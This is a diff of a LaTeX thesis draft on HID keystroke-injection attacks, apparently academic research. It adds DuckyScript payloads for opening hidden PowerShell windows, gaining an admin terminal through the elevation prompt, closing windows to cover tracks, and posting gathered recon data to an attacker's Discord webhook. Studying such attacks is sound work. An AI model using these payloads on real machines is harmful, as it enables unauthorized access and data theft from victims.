@@ -103,7 +103,7 @@ When preparing for an HID injection attack, a malicious actor has to pay attenti
 \subsubsection{Target}
 
 The foremost component to an attack is the target. It determines all other factors. Crucial is the goal of the attack, the level of available access, and the environment and characteristics of the target.\\
-The goal determines the type of attack, which will be further specified by the environment, chaarcteristics and access. [where am i going with this, in how far is it even relevant?] 
+The goal determines the type of attack, which will be further specified by the environment, characteristics and access. [where am i going with this, in how far is it even relevant?] 
 
 
 \section{Methodology} \label{methodology}
@@ -168,10 +168,119 @@ One underexplored area of the Mitre Att\&ck framework is the persistance categor
 
 \subsubsection{Schedule Processes}
 
-One under explored area of the Mitre Att\&ck framework is persistence. This Payloads aims to achieve persistence by registering processes that will run iteratively depedning on a customizable trigger. This processes can be anything from recon scripts, to other persistence payloads, like for example the end processes payload \ref{Iteratively End Processes} which could run in the background if set up like this.
+One under explored area of the Mitre Att\&ck framework is persistence. This Payloads aims to achieve persistence by registering processes that will run iteratively depending on a customizable trigger. This processes can be anything from recon scripts, to other persistence payloads, like for example the end processes payload \ref{Iteratively End Processes} which could run in the background if set up like this.
 
 
 \section{Implementation} \label{Implementation}
+
+\subsection{Prerequistites}
+have windows
+have powershell
+be unlocked ? 
+know the keybaord lanugage
+have a timeframe where the target is not typing anything else
+
+\subsection{Basics}
+
+Many payloads contain one or more common basic building blocks, namely opening application (mostly Powershell), getting admin rights, sending some data or how to close and application to cover up tracks.  \\
+This section will give a short overview over those use cases and how they can be implemented.
+
+
+\subsubsection{Opening an application}
+
+On windows, there are several ways to open an application. This can be rather complicated, i.e. finding the executable in the files and running it, or simply searching it in the windows search menu and accessing it from there. These are some of the ways in which applications can be opened;
+\begin{enumerate}
+    \item Running the executable requires intel on the victim's file structure. A more feasible alternative is the windows run menu, which can be opened with the windows key + r. Here the name of the application can be entered, i.e. powershell or powershell.exe. Additionally, it can work with parameters like --incognito can be used in combination with brave.exe to open a private tab of the brave browser. Or another example is opening powershell with window style hidden:
+    \begin{lstlisting}
+    STRING GUI r
+    STRINGLN powershell.exe -windowstyle hidden
+    \end{lstlisting}
+    \item Many windows system applications can be accessed through the windows power menu, which is accessed with windows key + x. This menu can be navigated with tabs or letters; every option has one underlined letter, by pressing the corresponding key on the keyboard, that option is executed. As illustration the following implementation uses this approach to open Task Manager:
+    \begin{lstlisting}
+    STRING GUI x
+    STRING t
+    \end{lstlisting}
+    \item Another windows menu can be used to open applications; the windows run menu. Simply pressing the windows key will open it, and autofocus the cursor to the search bar, such that the application name can be typed. It is advisable to type out the entire name of the desired application to make sure the correct version is selected (i.e. 'Outlook (new)' instead of just 'Outlook' to ensure that the new and not the old version is opened). It is also important to give the system some time to load the search results and not program the enter key immediately after starting the search
+    \begin{lstlisting}
+    STRING GUI
+    STRING Microsoft Teams (work or school)
+    DELAY 100
+    ENTER
+    \end{lstlisting}
+    \item Lastly, windows has default and customizable shortcuts that can be used to open applications. Commonly known is, for example, ctrl + shift + escape to open task manager. Application on the toolbar can similarly be openend through windows key + their index number. Assuming the attacker knows that the mail application is the first icon on the toolbar, they could run an payload that looks like this to open it:
+    \begin{lstlisting}
+    GUI + 1
+    \end{lstlisting}
+\end{enumerate}
+
+In general it holds, as always, that the best choice is the fastest and most reliable one, which would be the run windows option or the default shortcuts. Using the search menu creates time overhead and is a very obvious way of searching since the menu takes up such a big part of the screen. 
+
+\subsubsection{Admin Rights}
+
+Acquiring admin rights is mainly an issue when trying to execute admin level command in powershell. For these operations, poweshell should be run as administrator. \\
+The most straight forward approach for this is to use the power user menu and selecting Terminal (Admin) with the 'a' shortcut. If the current user is the administrator, a simple dialogue window will pop up to aks if the application should be allowed to make changes to the device. 'Yes' can be selected and powershell will open run with administrator access. If the current user is not the administrator, the prompt will ask for the admin password. \\
+\begin{lstlisting}
+GUI x
+DELAY 100
+STRINGLN a
+DELAY 600
+LEFTARROW
+DELAY 50
+ENTER
+\end{lstlisting}
+
+Another option is to search powershell in the search menu and navigating to the option 'Run as Administrator' \\
+\begin{lstlisting}
+GUI
+STRING Powershell
+DELAY 300
+RIGHTARROW
+DELAY 50
+DOWNARROW
+ENTER
+\end{lstlisting}
+
+\subsubsection{Closing applications}
+
+In Windows exists a little menu for every open window. It can be accessed by right clicking somewhere in the header of the window, or more simply having it focused and pressing the Alt and Space key on the keyboard simultaneously. \\
+The menu features the options '\underline{R}estore', '\underline{M}ove', '\underline{S}ize', 'Mi\underline{n}imize', 'Ma\underline{x}imize', and '\underline{C}lose'. The underlined letter in every option marks its shortcut. This can be used to minimize active windows or closing them after running a payload to cover tracks.
+\begin{lstlisting}
+ALT SPACE
+DELAY 50
+STRING c
+\end{lstlisting}
+It is important to keep in mind, that the name of these options and with that their shortcuts are dependent on the system language. \\
+Another common shortcut for closing focused windows is Alt F4.
+\begin{lstlisting}
+ALT F4
+\end{lstlisting}
+\\
+
+An option specifically for closing powershell windows is the shell keyword 'exit' :
+\begin{lstlisting}
+STRINGLN exit
+\end{lstlisting}
+
+
+\subsubsection{Sending Recon to a Server}
+
+When gathering some information form the victim's laptop, the question arises how this information can be forwarded to the attacker. While there is a myriad for possibilities for this, ranging from physical attraction, to Bluetooth, to basic IP packets, this thesis will elaborate on two ways to send information using a connection to an internet network.
+One option to send out information is to send it to an already established server. The O.MG repository on github features examples for sending intel to a dropbox or discord server, sending via Teams, Email and more. The advantage of sending information over a requently used communication channel like this, is that it looks very iconspicuous and will probably pass through firewalls.\\
+One example of sending an xml object to a discord webhook given the webhook address and the content for the xml object:
+\begin{lstlisting}
+STRING $xmlObject = [xml]$xmlContent
+ENTER
+STRING $Payload = @{xml = $xmlObject}
+ENTER
+STRING $Json = @{content = $Payload | ConvertTo-Json } | ConvertTo-Json	
+ENTER
+STRING Invoke-RestMethod -Uri $Webhook -Method Post -Body $Json -ContentType 'application/json'
+ENTER
+\end{lstlisting}
+
+This approach would also be possible with a custom server by replacing the webhook with the server address.
+
+
 
 \subsection{Payloads}
 
